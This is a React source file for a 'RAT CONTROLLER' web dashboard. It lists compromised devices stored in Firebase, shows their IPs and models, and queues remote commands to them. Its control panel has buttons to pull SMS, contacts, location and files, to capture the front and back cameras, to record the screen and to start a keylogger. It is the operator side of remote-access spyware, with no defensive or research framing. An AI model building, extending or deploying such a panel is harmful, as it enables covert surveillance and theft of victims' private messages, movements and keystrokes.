import React, { useState, useEffect } from 'react';
import { database, ref, onValue, update, get } from './firebase/config';
import './styles/global.css';

function App() {
  const [devices, setDevices] = useState({});
  const [selectedDevice, setSelectedDevice] = useState(null);
  const [deviceData, setDeviceData] = useState(null);
  const [activeView, setActiveView] = useState('dashboard');
  const [stats, setStats] = useState({ total: 0, online: 0, offline: 0 });
  const [loading, setLoading] = useState(false);
  const [commandResult, setCommandResult] = useState('');
  
  useEffect(() => {
    const devicesRef = ref(database, 'devices');
    const unsubscribe = onValue(devicesRef, (snapshot) => {
      const data = snapshot.val();
      if (data) {
        setDevices(data);
        const total = Object.keys(data).length;
        let online = 0;
        Object.values(data).forEach(d => {
          if (d.status === 'online') online++;
        });
        setStats({ total, online, offline: total - online });
      }
    });
    return () => unsubscribe();
  }, []);
  
  const selectDevice = (deviceId) => {
    setLoading(true);
    const detailRef = ref(database, `devices/${deviceId}`);
    get(detailRef).then((snapshot) => {
      const data = snapshot.val();
      if (data) {
        setDeviceData(data);
        setSelectedDevice(deviceId);
        setActiveView('control');
        setCommandResult('');
      }
      setLoading(false);
    });
  };
  
  const sendCommand = (command, payload = {}) => {
    if (!selectedDevice) return;
    const cmdRef = ref(database, `commands/${selectedDevice}`);
    const commandId = Date.now().toString();
    update(cmdRef, {
      [commandId]: {
        type: command,
        payload: payload,
        timestamp: Date.now(),
        status: 'pending'
      }
    });
    setCommandResult(`[CMD] ${command} sent to ${selectedDevice.substring(0, 12)}...`);
    
    const responseRef = ref(database, `responses/${selectedDevice}`);
    setTimeout(() => {
      const responseUnsub = onValue(responseRef, (snap) => {
        const resp = snap.val();
        if (resp) {
          const lastResp = Object.values(resp).pop();
          if (lastResp && lastResp.command === command) {
            setCommandResult(JSON.stringify(lastResp.data, null, 2));
            responseUnsub();
          }
        }
      });
    }, 1000);
  };
  
  const renderDashboard = () => (
    <div>
      <div className="dashboard-grid">
        {Object.keys(devices).map((id) => {
          const device = devices[id];
          return (
            <div key={id} className="device-card" onClick={() => selectDevice(id)}>
              <div className="device-header">
                <div className="device-name">{device.name || 'Unknown'}</div>
                <div className={`status-badge ${device.status === 'online' ? '' : 'offline'}`}>
                  {device.status || 'offline'}
                </div>
              </div>
              <div className="device-details">
                <span>ID: {id.substring(0, 16)}...</span>
                <span>OS: {device.os || 'Unknown'}</span>
                <span>IP: {device.ip || '0.0.0.0'}</span>
                <span>Model: {device.model || 'N/A'}</span>
                <span>Last: {device.lastSeen ? new Date(device.lastSeen).toLocaleString() : 'Never'}</span>
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
  
  const renderControlPanel = () => {
    if (!deviceData) return <div>Loading device data...</div>;
    
    return (
      <div className="control-panel">
        <div className="panel-title">
          {deviceData.name || 'Device'} - Control Center
          <span style={{ fontSize: '0.8rem', opacity: 0.6, marginLeft: '15px' }}>
            {selectedDevice.substring(0, 12)}...
          </span>
        </div>

        <div className="control-grid">
          <button className="control-btn" onClick={() => sendCommand('toggle_flash')}>
            <span className="btn-icon">FL</span>
            <span className="btn-label">Toggle Flashlight</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('get_sms')}>
            <span className="btn-icon">SM</span>
            <span className="btn-label">Get SMS</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('get_device_info')}>
            <span className="btn-icon">DI</span>
            <span className="btn-label">Device Info</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('get_location')}>
            <span className="btn-icon">LO</span>
            <span className="btn-label">Get Location</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('camera_front')}>
            <span className="btn-icon">CF</span>
            <span className="btn-label">Front Camera</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('camera_back')}>
            <span className="btn-icon">CB</span>
            <span className="btn-label">Back Camera</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('start_keylogger')}>
            <span className="btn-icon">KL</span>
            <span className="btn-label">Keylogger</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('record_screen')}>
            <span className="btn-icon">SR</span>
            <span className="btn-label">Screen Record</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('list_files', { path: '/' })}>
            <span className="btn-icon">FE</span>
            <span className="btn-label">File Explorer</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('get_contacts')}>
            <span className="btn-icon">CT</span>
            <span className="btn-label">Contacts</span>
          </button>

          <button className="control-btn" onClick={() => sendCommand('get_wifi')}>
            <span className="btn-icon">WF</span>
            <span className="btn-label">WiFi Scanner</span>
          </button>
        </div>

        {commandResult && (
          <div className="data-display">
            <pre>{commandResult}</pre>
          </div>
        )}

        <div style={{ marginTop: '25px', display: 'flex', gap: '15px', flexWrap: 'wrap' }}>
          <button 
            className="gold-primary-btn"
            onClick={() => {
              setSelectedDevice(null);
              setDeviceData(null);
              setActiveView('dashboard');
              setCommandResult('');
            }}
          >
            Back to Dashboard
          </button>
          <button 
            className="gold-outline-btn"
            onClick={() => setCommandResult('')}
          >
            Clear Output
          </button>
        </div>
      </div>
    );
  };
  
  return (
    <div>
      <video autoPlay loop muted playsInline className="video-background">
        <source src="/bg-video.mp4" type="video/mp4" />
      </video>
      <div className="overlay-gradient"></div>

      <div className="app-wrapper">
        <div className="header-bar">
          <div className="logo-section">
            <img src="/logo.svg" alt="RAT Controller" className="logo-icon" />
            <div className="app-title">RAT CONTROLLER</div>
          </div>
          <div className="header-stats">
            <div className="stat-badge">
              <div className="number">{stats.total}</div>
              <div className="label">Total</div>
            </div>
            <div className="stat-badge">
              <div className="number" style={{ color: '#00ff00' }}>{stats.online}</div>
              <div className="label">Online</div>
            </div>
            <div className="stat-badge">
              <div className="number" style={{ color: '#ff4444' }}>{stats.offline}</div>
              <div className="label">Offline</div>
            </div>
            <button 
              className="gold-primary-btn"
              onClick={() => {
                setActiveView('dashboard');
                setSelectedDevice(null);
                setDeviceData(null);
                setCommandResult('');
              }}
              style={{ padding: '8px 20px', fontSize: '0.7rem' }}
            >
              Refresh
            </button>
          </div>
        </div>

        {activeView === 'dashboard' && renderDashboard()}
        {activeView === 'control' && renderControlPanel()}
      </div>
    </div>
  );
}

export default App;